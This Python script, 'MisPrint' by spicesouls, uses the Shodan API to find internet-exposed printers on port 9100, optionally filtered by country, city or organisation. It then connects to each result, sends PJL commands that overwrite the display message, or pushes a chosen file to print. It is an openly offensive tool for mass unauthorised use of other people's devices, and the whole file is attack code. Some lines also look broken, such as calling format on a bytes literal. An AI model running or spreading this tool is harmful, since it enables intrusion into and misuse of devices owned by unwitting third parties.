'''

https://github.com/spicesouls/misprint

https://github.com/spicesouls

https://spicesouls.github.io

'''

banner = """
            _        ___      _       _   
      /\/\ (_)___   / _ \_ __(_)_ __ | |_ 
     /    \| / __| / /_)/ '__| | '_ \| __|
    / /\/\ \ \__ \/ ___/| |  | | | | | |_ 
    \/    \/_|___/\/    |_|  |_|_| |_|\__|                                
  ,----,------------------------------,------.
  | ## |                              |    - |
  | ## |                              |    - |
  |    |------------------------------|    - |
  |    ||............................||      |
  |    ||,-                        -.||      |
  |    ||___                      ___||    ##|
  |    ||---`--------------------'---||      |
  `--mb'|_|______________________==__|`------'
"""
def green(message):
    print(f'[\u001b[32m+\u001b[0m] {message}')
def red(message):
    print(f'[\u001b[31mx\u001b[0m] {message}')
def yellow(message):
    print(f'[\u001b[33m?\u001b[0m] {message}')
try:
    import os, sys
    import json
    import shodan
    import socks, socket
    import argparse
    import requests
    import colorama
    colorama.init()
except Exception as ex:
    red(f'Error: {ex}')
    sys.exit()


parser = argparse.ArgumentParser()
parser.add_argument('apikey', help='Your Shodan API Key', type=str)
parser.add_argument('file', help='The File to print', type=str)
parser.add_argument('message', help='The Message to show on the printer screen', type=str)
parser.add_argument('--country', help='The Target Country to find Printers', type=str)
parser.add_argument('--city', help='The Target City to find Printers', type=str)
parser.add_argument('--org', help='The Target organization to find Printers', type=str)
args = parser.parse_args()


print(banner)

### Step 1: Collecting Printers
print('''
######################################
#        Collecting Printers         #
######################################
''')

yellow('Reading Shodan API Key...')
apikey = args.apikey
try:
    shodanbot = shodan.Shodan(apikey)
    green(f'Loaded Shodan API Key: {apikey}')
except Exception as ex:
    red(f'Error Loading API Key: {ex}')
    sys.exit()

yellow('Searching For Target Printers...')
#
if not args.country:
    countryarg = ''
else:
    countryarg = f'country {args.country}'
#
if not args.org:
    orgarg = ''
else:
    orgarg = f'org {args.org}'
#
if not args.city:
    cityarg = ''
else:
    cityarg = f'city {args.city}'
#
shodanresults = shodanbot.search(f'9100 {countryarg} {orgarg} {cityarg}')
total = str(shodanresults['total'])
if shodanresults['total'] < 1:
    red('No Targets Found. Are your search terms correct?')
    sys.exit()
green(f'Found {total} Possible Targets')

ipaddrs = []

for result in shodanresults['matches']:
    result = result['ip_str']
    result = result.replace(" ", "")
    result = result.replace("\n", "")

    ipaddrs.append(result)



### Step 2: Sending Off File

print('''
######################################
#         Sending Off File           #
######################################
''')

def printertest(id_printer):
    if id_printer.split('\n')[1].replace('\n', '').replace('"', '').replace("'", '').startswith('DISPLAY'):
        return False
    else: 
        return id_printer.split('\n')[1].replace('\n', '').replace('"', '').replace("'", '')


def connect(ip, raw):
    s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    try:
        yellow(f'Connecting to {ip}...')
        try:
            s.connect((ip, 9100))
        except Exception:
            red(f'Connection To {ip} Failed.')
            return False
        green(f'Connected To {ip}!')
        yellow('Trying PJL...')
        s.send(b'@PJL INFO STATUS\n')
        try:
            recv = s.recv(1024)
        except socket.timeout:
            recv = b''
        if recv.decode('UTF-8').startswith('@'):
            green('PJL Working!')
            s.send(b'@PJL INFO ID\n')
            id_printer = s.recv(1024)
            if not printertest(id_printer):
                red('Failed To Get Printer Name.')
            else:
                green(f'Printer Name: {printertest(id_printer)}')
            yellow(f'Setting Screen to {args.message}...')
            s.send(b'@PJL RDYMSG DISPLAY="{}"\n'.format(args.message))
            green('Success!')
            yellow('Closing connection...')
            s.close()
            return 'message'
        elif recv.decode('UTF-8') == '':
            green('RAW Protocol Detected!')
            yellow('Sending File...')
            s.send(bytes(raw, 'UTF-8'))
            green('File has been sent!')
            yellow('Closing connection...')
            s.close()
            return 'raw'
        else:
            red('No Protocols detected.')
            yellow('Closing connection...')
            s.close()
            return 'invalid'
    except Exception as ex:
        red(f'Error: {ex}')
        return 'connectionfailed'
messagessent = 0
rawssent = 0
noprotocols = 0
failedconnections = 0
def printerpwn(ipaddrs, raw):
    global messagessent
    global rawssent
    global noprotocols
    global failedconnections
    messagessent = 0
    rawssent = 0
    noprotocols = 0
    failedconnections = 0
    for ip in ipaddrs:
        print(f'\n--- {ip} ---')
        output = connect(ip, raw)
        if output == 'message':
            messagessent += 1
        if output == 'raw':
            rawssent += 1
        if output == 'invalid':
            noprotocols += 1
        if output == 'connectionfailed':
            failedconnections += 1


yellow(f'Collecting File {args.file}...')
with open(args.file, 'rb') as file:
    raw = file.read()
    green(f'Data from {args.file} Collected!')
    printerpwn(ipaddrs, raw)
file.close()

### Step 3: Results
printertotal = messagessent + rawssent

print(f'''\n\n
######################################
#              Results               #
######################################

Message Sent        :       {args.message}
Targets Found       :       {total} 

Valid Printers      :       {str(printertotal)}
Invalid Printers    :       {str(noprotocols)}

Files Sent          :       {str(rawssent)}
Messages Sent       :       {str(messagessent)}

MisPrint 2020 // Made By SpiceSouls // github.com/spicesouls
''')


